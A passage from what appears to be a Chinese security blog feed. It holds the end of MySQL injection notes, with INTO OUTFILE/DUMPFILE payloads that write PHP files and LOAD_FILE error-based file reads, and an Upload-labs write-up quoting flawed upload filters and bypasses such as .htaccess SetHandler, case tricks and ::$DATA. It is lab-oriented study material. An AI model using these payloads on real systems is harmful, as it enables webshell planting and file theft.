href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h2><p>主要用途：写shell<br>要求：</p><ul><li>要求用户具有file权限</li><li>文件不能覆盖写入，所以文件必须为不存在</li><li>如果secure_file_priv非空，则写入文件的目录只能为对应目录下<blockquote><p>into outfile + UNION</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> uid = <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0x3c3f70687020706870696e666f28293b3f3e</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'Y:/123.php'</span>;</span><br></pre></td></tr></table></figure></blockquote></li></ul><p><img src="/MySQL Injection.resources/99802F7E-613B-4F25-8942-026AECDBE222.png" alt="bbeb09b67630a772e19b3b26e4f90b79"></p><blockquote><p>into outfile + LINES TERMINATED BY (limit)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'Y:/123.php'</span> <span class="keyword">LINES</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="number">0x3c3f70687020706870696e666f28293b3f3e</span>;</span><br></pre></td></tr></table></figure></p></blockquote><p><img src="/MySQL Injection.resources/B0EEFE16-15A3-4E45-8DA7-616987B525AC.png" alt="0313b6aaee866dee9ee0cc785bc89e7b"></p><blockquote><p>into outfile + FIELDS TERMINATED BY (limit)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'Y:/123.php'</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span>  <span class="number">0x3c3f70687020706870696e666f28293b3f3e</span>;</span><br></pre></td></tr></table></figure></p></blockquote><p><img src="/MySQL Injection.resources/2E99B9C7-7369-4853-9669-7C5D56934A8B.png" alt="922aaffeb4b239df59cf0ddbea8241a2"></p><blockquote><p>into outfile + LINES STARTING BY (limit)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'Y:/123.php'</span> <span class="keyword">LINES</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="number">0x3c3f70687020706870696e666f28293b3f3e</span>;</span><br></pre></td></tr></table></figure></p></blockquote><p><img src="/MySQL Injection.resources/1DE8F60F-049E-4760-8B5A-6CB07714C781.png" alt="07ad0be0a19833ec877e9c7d77f0e0bc"></p><h2 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a>load_file</h2><p>主要用途：读文件<br>要求：</p><ul><li>要求用户具有file权限</li><li>如果secure_file_priv非空，则只能读取对应目录下的文件<blockquote><p>load_file + UNION</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid = <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,(<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'Y:/123.php'</span>));</span><br></pre></td></tr></table></figure></blockquote></li></ul><p><img src="/MySQL Injection.resources/72271A75-3061-4252-BE6A-8A25F2D836FF.png" alt="fda87515edd1a870031c33556799b653"></p><blockquote><p>load_file + updatexml<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>  <span class="keyword">where</span> username = <span class="string">''</span> <span class="keyword">and</span> updatexml(<span class="number">0</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">LOAD_FILE</span>(<span class="string">'Y:/123.php'</span>)),<span class="number">0x7e</span>),<span class="number">0</span>);</span><br></pre></td></tr></table></figure></p></blockquote><p><img src="/MySQL Injection.resources/DDB31E30-84C6-4631-A40C-6A827C57AD55.png" alt="3b346d668d3dab3c2296330ac5421acd"></p><blockquote><p>load_file + extractive<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid=<span class="number">-1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> (<span class="keyword">LOAD_FILE</span>(<span class="string">'Y:/1.php'</span>))),<span class="number">0x7e</span>)));</span><br></pre></td></tr></table></figure></p></blockquote><p><img src="/MySQL Injection.resources/4372D4EB-AC68-4E4B-9CD7-A7B7C0577854.png" alt="d068cdb2be5e81cf8ee618282fc0bb8f"></p><blockquote><p>load_file + isnull + updatexml<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>  <span class="keyword">where</span> username = <span class="string">''</span> <span class="keyword">and</span> updatexml(<span class="number">0</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">isnull</span>(<span class="keyword">LOAD_FILE</span>(<span class="string">'D:/1.php'</span>)),<span class="number">0x7e</span>),<span class="number">0</span>);</span><br></pre></td></tr></table></figure></p></blockquote><p>存在文件 返回0<br>不存在文件 返回1<br><img src="/MySQL Injection.resources/01D4A547-30E3-465F-A87C-0EA99176FBDF.png" alt="d54a32ed2b31fc6fb134d7275f17eae8"></p><h2 id="Dumpfile"><a href="#Dumpfile" class="headerlink" title="Dumpfile"></a>Dumpfile</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> _utf8<span class="string">'Hello world!'</span> <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'Y:/world.php'</span>;</span><br></pre></td></tr></table></figure><p><img src="/MySQL Injection.resources/9DCC84F2-4346-4F76-A753-2F7813A9DFE7.png" alt="c5c1ec183eb4aba323bedb95d56f2100"></p><h2 id="Case-When"><a href="#Case-When" class="headerlink" title="Case When"></a>Case When</h2><p><img src="/MySQL Injection.resources/QQ20190423-122637@2x.png" alt="QQ20190423-122637@2x.png"></p><h2 id="Pow"><a href="#Pow" class="headerlink" title="Pow"></a>Pow</h2><p><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/55CC5315-17DB-49AC-BBF3-8B0316AA3933.png" alt="2cb4372b6213be745ecbf701adc81349.png"><br>运算符作条件判断，如果错误数据库报错：利用pow的溢出判断limit位数的ascii</p><p><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/DF663A7F-EB5F-41F6-9BFE-AE5A783CCF84.png" alt="f4abcef6f90ea02665adaf0f61d6ee7f.png"></p><h2 id="In"><a href="#In" class="headerlink" title="In"></a>In</h2><p><img src="/MySQL Injection.resources//QQ20190423-122422@2x.png" alt="QQ20190423-122422@2x.png"></p><h2 id="不知道列名的注入"><a href="#不知道列名的注入" class="headerlink" title="不知道列名的注入"></a>不知道列名的注入</h2><p>看原文比较好，直接复现一下<br><img src="/MySQL Injection.resources/1359C87C-0FD0-4CEC-94C2-C7FD53622F20.png" alt="292940479295c820fe09ee52cc66aa61"><br><img src="/MySQL Injection.resources/C5353C73-C707-450C-AB0E-BC841DCDA2C9.png" alt="aa99b8908afbca3697612a580cf940eb"><br><img src="/MySQL Injection.resources/36489756-1393-404C-B72F-64E08CBF6877.png" alt="9dbf0195c2217b9ae5bc52ca52e89fd6"><br><img src="/MySQL Injection.resources/6B13EF6C-92F9-4238-9A6D-D6BBC9DB2A8A.png" alt="232655760d9f318c95d8c69b68f1827f"></p><h2 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h2><p><a href="https://www.lucifaer.com/2018/08/13/MySQLi%20Cookbook/" target="_blank" rel="noopener">MySQLi Cookbook</a><br><a href="https://www.cnblogs.com/lcamry/" target="_blank" rel="noopener">lcamry’s blog</a><br><a href="https://xz.aliyun.com/t/2460" target="_blank" rel="noopener">报错注入邂逅load_file&amp;into outfile搭讪LINES</a><br><a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/" target="_blank" rel="noopener">sqli-extracting-data-without-knowing-columns-name</a><br><a href="https://legacy.gitbook.com/book/wangyihang/sqli-labs/details" target="_blank" rel="noopener">wangyihang-sqli-labs-Script</a><br><a href="https://xz.aliyun.com/t/3992" target="_blank" rel="noopener">史上最水的MYSQL注入总结</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-04-14 23:20:33&lt;br&gt;&lt;img src=&quot;/wallpaper/[33016]Avian Romance-54238596.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockq
      
    
    </summary>
    
    
      <category term="SQL注入" scheme="http://patrilic.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Upload-labs Writeup</title>
    <link href="http://patrilic.top/2019/04/05/Upload-labs%20Writeup/"/>
    <id>http://patrilic.top/2019/04/05/Upload-labs Writeup/</id>
    <published>2019-04-05T03:20:33.000Z</published>
    <updated>2019-08-16T05:08:59.621Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-01-05 11:20:33<br><img src="/wallpaper/[33923]浴衣と金魚-64535234.png" alt></p></blockquote><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>JS判断<br><img src="/Upload-labs Writeup.resources/D54B3191-87F4-4F13-ADBF-06C3397E9912.png" alt="15204cc819f306938e0e05fab0c8a733"><br>直接禁用js就行了<br><img src="/Upload-labs Writeup.resources/E0E1A579-43A9-47F5-AA58-BE90612361BF.png" alt="bd503f9c02ce3837249b0980b43c964f"></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>常规绕过，Content-type<br><img src="/Upload-labs Writeup.resources/B48B0549-170A-47E6-B233-A0D25702F9DD.png" alt="fa2937a93fdc5c282894598fa1dc444f"></p><p><img src="/Upload-labs Writeup.resources/2FD4EFB9-2A25-422C-8327-7F84A101B934.png" alt="2ffffe176ab2e0d459dd7c5fefdaa2c8"></p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br></pre></td></tr></table></figure><p>如果服务器解析php5，phtml类似的就可以直接上传，也没有限制.htaccess<br>方式多种</p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br></pre></td></tr></table></figure><p>过滤了一堆后缀，然而并没有过滤.htaccess文件，而且逻辑也有问题，先进行了全部的大小写<br>先上传一个.htaccess文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure></p><p>然后传图片马就行了</p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>过滤了.htaccess，同样可以大小写绕过<br><img src="/Upload-labs Writeup.resources/B2AF7B47-D3D1-4E9F-86D0-8EDF2B74755B.png" alt="79e2cbb899963a2068b71f1049b4337e"></p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><p>没有经过trim()</p><p>带个空格就绕过了<br><img src="/Upload-labs Writeup.resources/486CF065-9B96-4CE3-8A32-A31EDFD5A4B8.png" alt="58a7964d42643452fac118dc4305758b"></p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>这道题我自己也是跟网上一样，拿.绕过的，但是在linux机器上就不行了</p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>没过滤::$DATA，利用windows特性，绕过即可<br><img src="/Upload-labs Writeup.resources/1337E552-0041-45AC-B8A8-40624C2D96B9.png" alt="7f39092379c2cee9d132247267b73acc"></p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><code>$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;</code><br><img src="/Upload-labs Writeup.resources/305BF476-3E64-47F8-83F4-EE44A4FF5806.png" alt="f093845ad6b47cfd804dced38e167d45"></p><p><img src="/Upload-labs Writeup.resources/C4CD42B2-A826-472D-88BC-DF95FFD90092.png" alt="fa417a980b916b70b8b61d7002e4a895"></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 